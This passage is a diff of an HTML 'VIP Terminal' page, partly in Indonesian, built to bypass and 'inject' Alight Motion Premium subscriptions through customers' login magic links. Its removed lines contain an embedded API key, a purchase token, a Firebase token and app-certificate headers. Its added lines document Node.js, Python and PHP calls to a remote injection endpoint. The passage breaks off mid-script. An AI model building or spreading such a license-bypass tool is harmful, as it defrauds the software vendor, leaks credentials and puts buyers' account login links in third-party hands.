@@ -8,7 +8,7 @@
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <!-- FontAwesome 6 Icons -->
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
-    <!-- Google Fonts (Outfit & JetBrains Mono for code) -->
+    <!-- Google Fonts -->
     <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Outfit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     
     <style>
@@ -26,9 +26,7 @@
 
         body {
             background-color: var(--bg-base);
-            background-image: 
-                linear-gradient(rgba(157, 78, 221, 0.03) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(157, 78, 221, 0.03) 1px, transparent 1px);
+            background-image: linear-gradient(rgba(157, 78, 221, 0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(157, 78, 221, 0.03) 1px, transparent 1px);
             background-size: 30px 30px;
             color: var(--text-main);
             font-family: 'Outfit', sans-serif;
@@ -39,267 +37,41 @@
             overflow-x: hidden;
         }
 
-        .container-tech {
-            max-width: 800px;
-            margin: 0 auto;
-            position: relative;
-        }
-
-        /* Video Banner Setup */
-        .video-banner-wrapper {
-            position: relative;
-            width: 100%;
-            height: 180px;
-            border-radius: 16px 16px 0 0;
-            overflow: hidden;
-            border: 1px solid var(--border-tech);
-            border-bottom: 2px solid var(--primary-accent);
-            box-shadow: 0 0 25px rgba(157, 78, 221, 0.2);
-            animation: slideDown 0.8s cubic-bezier(0.16, 1, 0.3, 1) forwards;
-        }
-
-        .video-banner {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            filter: brightness(0.6) contrast(1.2);
-        }
-
-        .video-overlay {
-            position: absolute;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: linear-gradient(to top, var(--panel-bg) 0%, rgba(13, 13, 20, 0.2) 100%);
-            display: flex;
-            flex-direction: column;
-            justify-content: flex-end;
-            padding: 1.5rem;
-            z-index: 2;
-        }
-        
-        /* Top Navigation/Menu Button */
-        .system-info-btn {
-            position: absolute;
-            top: 15px;
-            right: 15px;
-            z-index: 10;
-            background: rgba(13, 13, 20, 0.7);
-            backdrop-filter: blur(5px);
-            border: 1px solid var(--secondary-accent);
-            color: var(--secondary-accent);
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 0.75rem;
-            padding: 6px 12px;
-            border-radius: 6px;
-            transition: all 0.3s;
-        }
-        
-        .system-info-btn:hover {
-            background: var(--secondary-accent);
-            color: #000;
-            box-shadow: 0 0 15px var(--glow-cyan);
-        }
-
-        /* Main Panel */
-        .tech-panel {
-            background: rgba(13, 13, 20, 0.95);
-            backdrop-filter: blur(10px);
-            border: 1px solid var(--border-tech);
-            border-top: none;
-            border-radius: 0 0 16px 16px;
-            padding: 2rem;
-            box-shadow: 0 15px 50px rgba(0, 0, 0, 0.8);
-            position: relative;
-            animation: fadeIn 1s ease-out forwards;
-        }
-
-        /* Micro UI / Tech Decor */
-        .micro-status-bar {
-            display: flex;
-            justify-content: space-between;
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 0.7rem;
-            color: var(--secondary-accent);
-            border-bottom: 1px dashed var(--border-tech);
-            padding-bottom: 0.5rem;
-            margin-bottom: 1.5rem;
-            text-transform: uppercase;
-        }
-
-        .blink-dot {
-            height: 8px; width: 8px;
-            background-color: var(--secondary-accent);
-            border-radius: 50%;
-            display: inline-block;
-            box-shadow: 0 0 10px var(--secondary-accent);
-            animation: blink 1.5s infinite;
-        }
-
-        /* Forms & Inputs */
-        .tech-label {
-            font-size: 0.85rem;
-            color: var(--text-dim);
-            letter-spacing: 1px;
-            text-transform: uppercase;
-            font-weight: 600;
-        }
-
-        .input-tech {
-            background: #08080c !important;
-            border: 1px solid var(--border-tech) !important;
-            color: var(--text-main) !important;
-            border-radius: 8px;
-            padding: 14px;
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 0.9rem;
-            transition: all 0.3s ease;
-        }
-
-        .input-tech:focus {
-            border-color: var(--primary-accent) !important;
-            box-shadow: inset 0 0 10px rgba(157, 78, 221, 0.1), 0 0 15px var(--glow-purple) !important;
-            outline: none;
-        }
-
-        .input-group-text.tech-icon {
-            background: #08080c;
-            border: 1px solid var(--border-tech);
-            color: var(--primary-accent);
-            border-right: none;
-        }
+        .container-tech { max-width: 800px; margin: 0 auto; position: relative; }
+        .video-banner-wrapper { position: relative; width: 100%; height: 180px; border-radius: 16px 16px 0 0; overflow: hidden; border: 1px solid var(--border-tech); border-bottom: 2px solid var(--primary-accent); box-shadow: 0 0 25px rgba(157, 78, 221, 0.2); animation: slideDown 0.8s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
+        .video-banner { width: 100%; height: 100%; object-fit: cover; filter: brightness(0.6) contrast(1.2); }
+        .video-overlay { position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: linear-gradient(to top, var(--panel-bg) 0%, rgba(13, 13, 20, 0.2) 100%); display: flex; flex-direction: column; justify-content: flex-end; padding: 1.5rem; z-index: 2; }
+        .system-info-btn { position: absolute; top: 15px; right: 15px; z-index: 10; background: rgba(13, 13, 20, 0.7); backdrop-filter: blur(5px); border: 1px solid var(--secondary-accent); color: var(--secondary-accent); font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; padding: 6px 12px; border-radius: 6px; transition: all 0.3s; }
+        .system-info-btn:hover { background: var(--secondary-accent); color: #000; box-shadow: 0 0 15px var(--glow-cyan); }
+        .tech-panel { background: rgba(13, 13, 20, 0.95); backdrop-filter: blur(10px); border: 1px solid var(--border-tech); border-top: none; border-radius: 0 0 16px 16px; padding: 2rem; box-shadow: 0 15px 50px rgba(0, 0, 0, 0.8); position: relative; animation: fadeIn 1s ease-out forwards; }
+        .micro-status-bar { display: flex; justify-content: space-between; font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; color: var(--secondary-accent); border-bottom: 1px dashed var(--border-tech); padding-bottom: 0.5rem; margin-bottom: 1.5rem; text-transform: uppercase; }
+        .blink-dot { height: 8px; width: 8px; background-color: var(--secondary-accent); border-radius: 50%; display: inline-block; box-shadow: 0 0 10px var(--secondary-accent); animation: blink 1.5s infinite; }
+        .tech-label { font-size: 0.85rem; color: var(--text-dim); letter-spacing: 1px; text-transform: uppercase; font-weight: 600; }
+        .input-tech { background: #08080c !important; border: 1px solid var(--border-tech) !important; color: var(--text-main) !important; border-radius: 8px; padding: 14px; font-family: 'JetBrains Mono', monospace; font-size: 0.9rem; transition: all 0.3s ease; }
+        .input-tech:focus { border-color: var(--primary-accent) !important; box-shadow: inset 0 0 10px rgba(157, 78, 221, 0.1), 0 0 15px var(--glow-purple) !important; outline: none; }
+        .input-group-text.tech-icon { background: #08080c; border: 1px solid var(--border-tech); color: var(--primary-accent); border-right: none; }
         .input-tech.with-icon { border-left: none !important; }
-
-        /* Tech Button */
-        .btn-tech {
-            background: linear-gradient(45deg, #7b2cbf, #9d4edd);
-            color: white;
-            border: 1px solid #c77dff;
-            border-radius: 8px;
-            padding: 14px;
-            font-weight: 700;
-            letter-spacing: 1px;
-            text-transform: uppercase;
-            position: relative;
-            overflow: hidden;
-            transition: all 0.3s;
-            box-shadow: 0 0 15px rgba(157, 78, 221, 0.4);
-            z-index: 1;
-        }
-
-        .btn-tech::before {
-            content: '';
-            position: absolute;
-            top: 0; left: -100%;
-            width: 100%; height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
-            transition: all 0.5s;
-            z-index: -1;
-        }
-
-        .btn-tech:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 0 25px var(--glow-purple);
-            color: white;
-        }
+        .btn-tech { background: linear-gradient(45deg, #7b2cbf, #9d4edd); color: white; border: 1px solid #c77dff; border-radius: 8px; padding: 14px; font-weight: 700; letter-spacing: 1px; text-transform: uppercase; position: relative; overflow: hidden; transition: all 0.3s; box-shadow: 0 0 15px rgba(157, 78, 221, 0.4); z-index: 1; }
+        .btn-tech::before { content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent); transition: all 0.5s; z-index: -1; }
+        .btn-tech:hover { transform: translateY(-2px); box-shadow: 0 0 25px var(--glow-purple); color: white; }
         .btn-tech:hover::before { left: 100%; }
-
-        /* Step Indicators */
-        .step-wrapper {
-            display: flex;
-            align-items: center;
-            margin-bottom: 1.5rem;
-            padding: 10px;
-            background: rgba(157, 78, 221, 0.05);
-            border-left: 3px solid var(--primary-accent);
-            border-radius: 4px;
-        }
-
-        /* Logs Console */
-        .terminal-box {
-            background: #000;
-            border: 1px solid var(--border-tech);
-            border-radius: 8px;
-            padding: 1rem;
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 0.8rem;
-            margin-top: 1.5rem;
-            box-shadow: inset 0 0 15px rgba(0, 0, 0, 1);
-        }
-
+        .btn-api { background: transparent; border: 1px dashed var(--secondary-accent); color: var(--secondary-accent); font-family: 'JetBrains Mono', monospace; text-transform: uppercase; letter-spacing: 2px; box-shadow: 0 0 10px rgba(0, 245, 212, 0.1); }
+        .btn-api:hover { background: rgba(0, 245, 212, 0.1); color: var(--secondary-accent); box-shadow: 0 0 20px rgba(0, 245, 212, 0.3); }
+        .step-wrapper { display: flex; align-items: center; margin-bottom: 1.5rem; padding: 10px; background: rgba(157, 78, 221, 0.05); border-left: 3px solid var(--primary-accent); border-radius: 4px; }
+        .terminal-box { background: #000; border: 1px solid var(--border-tech); border-radius: 8px; padding: 1rem; font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; margin-top: 1.5rem; box-shadow: inset 0 0 15px rgba(0, 0, 0, 1); }
         .log-prefix { color: #f72585; font-weight: bold; }
         .log-time { color: var(--text-dim); }
-
-        /* Modals Overlay (Shared) */
-        .modal-overlay {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.85);
-            backdrop-filter: blur(8px);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-            opacity: 0;
-            visibility: hidden;
-            transition: all 0.4s ease;
-        }
-
-        .modal-overlay.active {
-            opacity: 1;
-            visibility: visible;
-        }
-
-        /* Success & Info Modal Containers */
-        .custom-modal {
-            background: #0d0d14;
-            border: 1px solid var(--secondary-accent);
-            border-radius: 16px;
-            padding: 2.5rem;
-            max-width: 450px;
-            width: 90%;
-            box-shadow: 0 0 40px var(--glow-cyan);
-            transform: scale(0.8);
-            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-        
-        .modal-overlay.active .custom-modal {
-            transform: scale(1);
-        }
-
-        .success-icon {
-            font-size: 4rem;
-            color: var(--secondary-accent);
-            margin-bottom: 1rem;
-            text-shadow: 0 0 20px var(--glow-cyan);
-            animation: pulseSuccess 2s infinite;
-        }
-
-        /* About / Info Modal specific tweaks */
-        .info-modal {
-            border-color: var(--primary-accent);
-            box-shadow: 0 0 40px var(--glow-purple);
-            max-width: 500px;
-            padding: 2rem;
-        }
-
-        /* Animations */
-        @keyframes slideDown {
-            from { opacity: 0; transform: translateY(-30px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
-        }
-        @keyframes pulseSuccess {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.1); text-shadow: 0 0 30px var(--glow-cyan); }
-            100% { transform: scale(1); }
-        }
-        
+        .syntax-keyword { color: #c678dd; } .syntax-string { color: #98c379; } .syntax-function { color: #61afef; } .syntax-comment { color: #5c6370; }
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(8px); display: flex; justify-content: center; align-items: center; z-index: 9999; opacity: 0; visibility: hidden; transition: all 0.4s ease; }
+        .modal-overlay.active { opacity: 1; visibility: visible; }
+        .custom-modal { background: #0d0d14; border: 1px solid var(--secondary-accent); border-radius: 16px; padding: 2.5rem; max-width: 450px; width: 90%; box-shadow: 0 0 40px var(--glow-cyan); transform: scale(0.8); transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+        .modal-overlay.active .custom-modal { transform: scale(1); }
+        .success-icon { font-size: 4rem; color: var(--secondary-accent); margin-bottom: 1rem; text-shadow: 0 0 20px var(--glow-cyan); animation: pulseSuccess 2s infinite; }
+        .info-modal { border-color: var(--primary-accent); box-shadow: 0 0 40px var(--glow-purple); max-width: 500px; padding: 2rem; }
+        @keyframes slideDown { from { opacity: 0; transform: translateY(-30px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+        @keyframes pulseSuccess { 0% { transform: scale(1); } 50% { transform: scale(1.1); text-shadow: 0 0 30px var(--glow-cyan); } 100% { transform: scale(1); } }
         .anim-stagger-1 { animation: fadeIn 0.5s ease-out 0.2s both; }
         .anim-stagger-2 { animation: fadeIn 0.5s ease-out 0.4s both; }
         .anim-stagger-3 { animation: fadeIn 0.5s ease-out 0.6s both; }
@@ -308,15 +80,11 @@
 <body>
 
     <div class="container container-tech p-3 p-md-0">
-        
         <!-- Video Banner -->
         <div class="video-banner-wrapper">
-            <!-- Tombol Menu SYSTEM INFO -->
             <button class="system-info-btn" onclick="showAboutModal()">
                 <i class="fa-solid fa-server me-1"></i> SYSTEM INFO
             </button>
-
-            <!-- Pastikan video1.mp4 dan video2.mp4 ada di direktori yang sama -->
             <video id="bannerVideo" class="video-banner" autoplay muted playsinline>
                 <source src="video1.mp4" type="video/mp4">
             </video>
@@ -328,30 +96,21 @@
             </div>
         </div>
 
-        <!-- Main Panel Form -->
         <div class="tech-panel">
-            
             <div class="micro-status-bar">
-                <span>NODE: ASIA-SE-01</span>
-                <span>SEC: AES-256</span>
-                <span>PING: 14ms</span>
+                <span>NODE: ASIA-SE-01</span><span>SEC: AES-256</span><span>PING: 14ms</span>
             </div>
 
-            <!-- Custom Order ID Settings -->
             <div class="mb-4 pb-4 border-bottom border-secondary border-opacity-25 anim-stagger-1">
-                <label for="orderIdInput" class="tech-label mb-2">
-                    <i class="fa-solid fa-microchip me-1 text-info"></i> Injector Payload Prefix
-                </label>
+                <label for="orderIdInput" class="tech-label mb-2"><i class="fa-solid fa-microchip me-1 text-info"></i> Injector Payload Prefix</label>
                 <input type="text" class="form-control input-tech" id="orderIdInput" value="ZukaiDev-VIP-0000-">
             </div>
 
-            <!-- Step 1: Input Email -->
+            <!-- Step 1 -->
             <div id="step1" class="anim-stagger-2">
                 <div class="step-wrapper">
-                    <span class="badge bg-purple me-2 fs-6">STEP 01</span>
-                    <h6 class="mb-0 text-white fw-bold">INITIATE MAGIC LINK</h6>
+                    <span class="badge bg-purple me-2 fs-6">STEP 01</span><h6 class="mb-0 text-white fw-bold">INITIATE MAGIC LINK</h6>
                 </div>
-                
                 <div class="mb-4">
                     <label for="emailInput" class="tech-label mb-2">Target Account Email</label>
                     <div class="input-group">
@@ -359,19 +118,16 @@
                         <input type="email" class="form-control input-tech with-icon" id="emailInput" placeholder="buyer@email.com">
                     </div>
                 </div>
-                
                 <button class="btn btn-tech w-100" onclick="sendMagicLink()">
                     <i class="fa-solid fa-paper-plane me-2"></i> Transmit Verification Link
                 </button>
             </div>
 
-            <!-- Step 2: Input Verification Link (Hidden by Default) -->
+            <!-- Step 2 -->
             <div id="step2" style="display: none;">
                 <div class="step-wrapper">
-                    <span class="badge bg-info text-dark me-2 fs-6 fw-bold">STEP 02</span>
-                    <h6 class="mb-0 text-white fw-bold">EXECUTE PREMIUM INJECTION</h6>
+                    <span class="badge bg-info text-dark me-2 fs-6 fw-bold">STEP 02</span><h6 class="mb-0 text-white fw-bold">EXECUTE PREMIUM INJECTION</h6>
                 </div>
-
                 <div class="d-flex justify-content-between align-items-center bg-dark p-3 rounded-3 border border-secondary border-opacity-50 mb-4">
                     <div>
                         <small class="text-dim d-block" style="font-family: 'JetBrains Mono';">TARGET ID:</small>
@@ -379,15 +135,10 @@
                     </div>
                     <i class="fa-solid fa-fingerprint text-secondary fs-3 opacity-50"></i>
                 </div>
-
                 <div class="mb-4">
                     <label for="linkInput" class="tech-label mb-2">Pasted Magic Link (OOB Code)</label>
                     <textarea class="form-control input-tech" id="linkInput" rows="3" placeholder="https://alightcreative.com/login?..."></textarea>
-                    <div class="form-text text-warning mt-2" style="font-size: 0.75rem;">
-                        <i class="fa-solid fa-triangle-exclamation"></i> Paste link dari tombol email buyer kesini.
-                    </div>
                 </div>
-
                 <div class="d-flex flex-column gap-3">
                     <button class="btn btn-tech w-100" style="background: linear-gradient(45deg, #00b4d8, #0077b6); border-color: #90e0ef;" onclick="processPremium()">
                         <i class="fa-solid fa-bolt-lightning me-2"></i> Force Inject Premium
@@ -398,239 +149,160 @@
                 </div>
             </div>
 
-            <!-- Logs / Terminal -->
-            <div id="statusLog" class="terminal-box d-none anim-stagger-3">
+            <!-- TOMBOL API -->
+            <div class="mt-4 pt-3 border-top border-secondary border-opacity-25 anim-stagger-3">
+                <button class="btn btn-api w-100 py-3" onclick="toggleApiDocs()">
+                    <i class="fa-solid fa-code me-2"></i> API BUAT BOT ALIGHT MOTIONMU
+                </button>
+
+                <div id="apiDocsSection" class="terminal-box mt-3" style="display: none;">
+                    <div class="d-flex align-items-center mb-3 pb-2 border-bottom border-secondary border-opacity-25 gap-2">
+                        <button class="btn btn-sm btn-outline-info api-tab active" onclick="switchLang('nodejs')" id="tab-nodejs">Node.js</button>
+                        <button class="btn btn-sm btn-outline-info api-tab" onclick="switchLang('python')" id="tab-python">Python</button>
+                        <button class="btn btn-sm btn-outline-info api-tab" onclick="switchLang('php')" id="tab-php">PHP</button>
+                    </div>
+                    <div class="text-dim mb-3" style="font-size: 0.75rem;"><i class="fa-solid fa-circle-info text-info"></i> Endpoint Vercel Zukai Backend</div>
+
+                    <pre id="code-nodejs" class="m-0 text-white" style="font-size: 0.75rem; white-space: pre-wrap;"><span class="syntax-keyword">const</span> axios = <span class="syntax-function">require</span>(<span class="syntax-string">'axios'</span>);
+axios.<span class="syntax-function">post</span>(<span class="syntax-string">'https://www.juikoprem.my.id/api/inject'</span>, {
+    email: <span class="syntax-string">"buyer@email.com"</span>, oobCode: <span class="syntax-string">"MAGIC_LINK_NYA"</span>, orderId: <span class="syntax-string">"ZukaiDev-VIP-0001"</span>
+}).<span class="syntax-function">then</span>(res => <span class="syntax-function">console</span>.<span class="syntax-function">log</span>(res.data));</pre>
+
+                    <pre id="code-python" class="m-0 text-white" style="font-size: 0.75rem; white-space: pre-wrap; display: none;"><span class="syntax-keyword">import</span> requests
+requests.<span class="syntax-function">post</span>(<span class="syntax-string">"https://www.juikoprem.my.id/api/inject"</span>, json={
+    <span class="syntax-string">"email"</span>: <span class="syntax-string">"buyer@email.com"</span>, <span class="syntax-string">"oobCode"</span>: <span class="syntax-string">"MAGIC_LINK_NYA"</span>, <span class="syntax-string">"orderId"</span>: <span class="syntax-string">"ZukaiDev-VIP-0001"</span>
+}).<span class="syntax-function">json</span>()</pre>
+
+                    <pre id="code-php" class="m-0 text-white" style="font-size: 0.75rem; white-space: pre-wrap; display: none;"><span class="syntax-keyword">&lt;?php</span>
+$ch = <span class="syntax-function">curl_init</span>(<span class="syntax-string">'https://www.juikoprem.my.id/api/inject'</span>);
+<span class="syntax-function">curl_setopt</span>($ch, CURLOPT_POSTFIELDS, <span class="syntax-function">json_encode</span>([<span class="syntax-string">'email'</span>=><span class="syntax-string">'buyer@email.com'</span>, <span class="syntax-string">'oobCode'</span>=><span class="syntax-string">'LINK'</span>, <span class="syntax-string">'orderId'</span>=><span class="syntax-string">'ID'</span>]));
+<span class="syntax-function">curl_setopt</span>($ch, CURLOPT_HTTPHEADER, [<span class="syntax-string">'Content-Type:application/json'</span>]);
+<span class="syntax-function">curl_setopt</span>($ch, CURLOPT_RETURNTRANSFER, <span class="syntax-keyword">true</span>);
+<span class="syntax-keyword">echo</span> <span class="syntax-function">curl_exec</span>($ch); <span class="syntax-keyword">?></span></pre>
+                </div>
+            </div>
+
+            <!-- Terminal -->
+            <div id="statusLog" class="terminal-box d-none anim-stagger-3 mt-4">
                 <div class="d-flex align-items-center border-bottom border-secondary border-opacity-25 pb-2 mb-2">
-                    <span class="blink-dot me-2 bg-warning"></span>
-                    <span class="text-warning fw-bold">TERMINAL OUTPUT</span>
+                    <span class="blink-dot me-2 bg-warning"></span><span class="text-warning fw-bold">TERMINAL OUTPUT</span>
                 </div>
                 <div id="logText" class="text-secondary" style="word-break: break-all;"></div>
             </div>
-
-            <!-- Footer Text -->
             <div class="text-center mt-4 pt-3 border-top border-secondary border-opacity-25 anim-stagger-3">
-                <p style="color: #4b5563; font-size: 0.8rem; font-family: 'JetBrains Mono';">
-                    System Core v3.0 &copy; 2026 <span class="text-purple fw-bold">Zukai Developer</span>
-                </p>
+                <p style="color: #4b5563; font-size: 0.8rem; font-family: 'JetBrains Mono';">System Core v3.0 &copy; 2026 <span class="text-purple fw-bold">Zukai Developer</span></p>
             </div>
-
         </div>
     </div>
 
-    <!-- 1. Success Modal Popup -->
+    <!-- Modals -->
     <div class="modal-overlay" id="successModal">
         <div class="custom-modal text-center">
-            <i class="fa-solid fa-circle-check success-icon"></i>
-            <h3 class="text-white fw-bold mb-1">INJECTION SUCCESS</h3>
+            <i class="fa-solid fa-circle-check success-icon"></i><h3 class="text-white fw-bold mb-1">INJECTION SUCCESS</h3>
             <p class="text-info mb-4" style="font-family: 'JetBrains Mono'; font-size: 0.85rem;">Account is now Premium VIP</p>
-            
             <div class="bg-black p-3 rounded-3 border border-secondary border-opacity-25 mb-4 text-start">
-                <div class="mb-2">
-                    <small class="text-dim d-block">TARGET EMAIL:</small>
-                    <span class="text-white fw-bold" id="successEmail"></span>
-                </div>
-                <div>
-                    <small class="text-dim d-block">ORDER ID:</small>
-                    <span class="text-info fw-bold" style="font-family: 'JetBrains Mono';" id="successOrderId"></span>
-                </div>
+                <div class="mb-2"><small class="text-dim d-block">TARGET EMAIL:</small><span class="text-white fw-bold" id="successEmail"></span></div>
+                <div><small class="text-dim d-block">ORDER ID:</small><span class="text-info fw-bold" style="font-family: 'JetBrains Mono';" id="successOrderId"></span></div>
             </div>
-
             <button class="btn w-100 fw-bold" style="background: var(--secondary-accent); color: #000;" onclick="closeSuccessModal()">
                 <i class="fa-solid fa-power-off me-2"></i> ACKNOWLEDGE & CLOSE
             </button>
         </div>
     </div>
 
-    <!-- 2. System Info / About Modal -->
     <div class="modal-overlay" id="aboutModal">
         <div class="custom-modal info-modal">
             <div class="d-flex justify-content-between align-items-center mb-4 border-bottom border-secondary border-opacity-25 pb-3">
-                <h4 class="text-white fw-bold mb-0">
-                    <i class="fa-solid fa-microchip text-purple me-2"></i> SYSTEM INFO
-                </h4>
-                <button class="btn btn-sm btn-outline-secondary border-0" onclick="closeAboutModal()">
-                    <i class="fa-solid fa-xmark fs-4"></i>
-                </button>
+                <h4 class="text-white fw-bold mb-0"><i class="fa-solid fa-microchip text-purple me-2"></i> SYSTEM INFO</h4>
+                <button class="btn btn-sm btn-outline-secondary border-0" onclick="closeAboutModal()"><i class="fa-solid fa-xmark fs-4"></i></button>
             </div>
-            
-            <!-- About Website -->
             <div class="bg-black p-3 rounded-3 border border-secondary border-opacity-25 mb-3 text-start">
                 <h6 class="text-info fw-bold mb-2" style="font-family: 'JetBrains Mono'; font-size: 0.85rem;">> ABOUT_TERMINAL</h6>
-                <p class="text-dim mb-0" style="font-size: 0.85rem; line-height: 1.6;">
-                    <strong>Zukai VIP Terminal</strong> adalah antarmuka panel *reseller* tingkat lanjut (Advanced Edition) yang dirancang untuk mem-bypass dan menginjeksi lisensi Premium Alight Motion secara instan menggunakan integrasi sistem *OOB Code Protocol*. Dilengkapi dengan simulasi UI bergaya *Cyber-Security* untuk pengalaman pengguna yang maksimal.
-                </p>
+                <p class="text-dim mb-0" style="font-size: 0.85rem; line-height: 1.6;"><strong>Zukai VIP Terminal</strong> terintegrasi penuh secara Serverless. Aman dari kebocoran token pada frontend.</p>
             </div>
-
-            <!-- About Developer -->
             <div class="bg-black p-3 rounded-3 border border-secondary border-opacity-25 mb-4 text-start">
                 <h6 class="text-purple fw-bold mb-2" style="font-family: 'JetBrains Mono'; font-size: 0.85rem;">> DEVELOPER_DATA</h6>
                 <ul class="list-unstyled text-dim mb-0" style="font-size: 0.85rem;">
                     <li class="mb-2"><strong class="text-white">Alias:</strong> Zukai Developer</li>
-                    <li class="mb-2"><strong class="text-white">Role:</strong> Lead Architecture & UI Engineer</li>
-                    <li class="mb-2"><strong class="text-white">System Version:</strong> v3.0 (Cyber Edition)</li>
-                    <li><strong class="text-white">Build Date:</strong> Oktober 2026</li>
+                    <li class="mb-2"><strong class="text-white">System:</strong> API Serverless v3.0</li>
                 </ul>
             </div>
-
-            <button class="btn btn-tech w-100 fw-bold" onclick="closeAboutModal()">
-                <i class="fa-solid fa-check me-2"></i> CLOSE SYSTEM INFO
-            </button>
+            <button class="btn btn-tech w-100 fw-bold" onclick="closeAboutModal()"><i class="fa-solid fa-check me-2"></i> CLOSE</button>
         </div>
     </div>
 
-    <!-- Script Utama -->
     <script>
-        // --- 1. LOGIKA VIDEO ROTATION ---
         const videos = ['video1.mp4', 'video2.mp4'];
         let currentVideoIdx = 0;
         const bannerVideo = document.getElementById('bannerVideo');
+        bannerVideo.addEventListener('ended', () => { currentVideoIdx = (currentVideoIdx + 1) % videos.length; bannerVideo.src = videos[currentVideoIdx]; bannerVideo.play(); });
 
-        bannerVideo.addEventListener('ended', () => {
-            currentVideoIdx = (currentVideoIdx + 1) % videos.length;
-            bannerVideo.src = videos[currentVideoIdx];
-            bannerVideo.play();
-        });
-
-
-        // --- 2. KONFIGURASI API (TIDAK DIUBAH) ---
-        const CONFIG = {
-            API_KEY: "AIzaSyDtG1AU22ErnQD60AzBAcaknySiz9_CEq0",
-            PRODUCT_ID: "am.full.sub.annual.19q4",
-            TOKEN: "mmgaobamlahbbeccfplmbkbb.AO-J1OzqG0or_GJJIx-ms8GrTm-jaglCRfhQSRPUZKpl2YspYS-oN7_94uv8RC5vQbvd_Ios2pPDStZ2n7F0hLE3FiOU7HS3R6Fquulv5xLXFECSv4ctElw",
-            SKU_TYPE: "subs",
-            FIREBASE_INSTANCE_ID_TOKEN: "cSDnCyp3T-uwp07z3tL86T:APA91bFkmvvsHw5nnqa1SBFci-99DRsKClLiETdRrVcJjS5yBx1v_FbCb1d8WhBuea_zmwnYBktyTIzcRhN4b6uNOUur9wPc0gKXmJDoZic0LhNq5V2s0xI",
-            HEADERS: {
-                "Content-Type": "application/json",
-                "X-Android-Package": "com.alightcreative.motion",
-                "X-Android-Cert": "ECA6BF91B8715A6F810ED0BBFC65B6CD578F52A8"
-            }
-        };
-
-        // --- 3. LOGIKA UI & TERMINAL ---
-        function getTimestamp() {
-            const now = new Date();
-            return `${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}`;
+        function toggleApiDocs() { const section = document.getElementById('apiDocsSection'); section.style.display = section.style.display === 'none' ? 'block' : 'none'; }
+        function switchLang(lang) {
+            document.getElementById('code-nodejs').style.display = 'none'; document.getElementById('code-python').style.display = 'none'; document.getElementById('code-php').style.display = 'none';
+            document.querySelectorAll('.api-tab').forEach(btn => { btn.classList.remove('btn-info', 'text-dark', 'active'); btn.classList.add('btn-outline-info'); });
+            document.getElementById(`code-${lang}`).style.display = 'block'; const activeTab = document.getElementById(`tab-${lang}`); activeTab.classList.remove('btn-outline-info'); activeTab.classList.add('btn-info', 'text-dark', 'active');
         }
-
+        function showSuccessModal(email, orderId) { document.getElementById('successEmail').innerText = email; document.getElementById('successOrderId').innerText = orderId; document.getElementById('successModal').classList.add('active'); }
+        function closeSuccessModal() { document.getElementById('successModal').classList.remove('active'); resetForm(); }
+        function showAboutModal() { document.getElementById('aboutModal').classList.add('active'); }
+        function closeAboutModal() { document.getElementById('aboutModal').classList.remove('active'); }
+        function getTimestamp() { const now = new Date(); return `${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}`; }
+        
         function showLog(text, isError = false) {
-            const logBox = document.getElementById('statusLog');
-            const logText = document.getElementById('logText');
-            logBox.classList.remove('d-none');
-            
-            const colorClass = isError ? "text-danger" : "text-info";
-            const prefix = isError ? "[ERROR]" : "[SYSTEM]";
-            
-            // Append log (not replace) to make it look like a real terminal
+            const logBox = document.getElementById('statusLog'); const logText = document.getElementById('logText');
+            logBox.classList.remove('d-none'); const colorClass = isError ? "text-danger" : "text-info"; const prefix = isError ? "[ERROR]" : "[SYSTEM]";
             logText.innerHTML += `<div class="mb-1"><span class="log-time">[${getTimestamp()}]</span> <span class="log-prefix ${colorClass}">${prefix}</span> <span class="text-light">${text}</span></div>`;
             logText.scrollTop = logText.scrollHeight;
         }
 
-        // --- 4. MODALS CONTROL (SUCCESS & ABOUT) ---
-        function showSuccessModal(email, orderId) {
-            document.getElementById('successEmail').innerText = email;
-            document.getElementById('successOrderId').innerText = orderId;
-            document.getElementById('successModal').classList.add('active');
-        }
+        function resetForm() { document.getElementById('step1').style.display = 'block'; document.getElementById('step2').style.display = 'none'; document.getElementById('linkInput').value = ''; document.getElementById('statusLog').classList.add('d-none'); document.getElementById('logText').innerHTML = ''; }
 
-        function closeSuccessModal() {
-            document.getElementById('successModal').classList.remove('active');
-            resetForm();
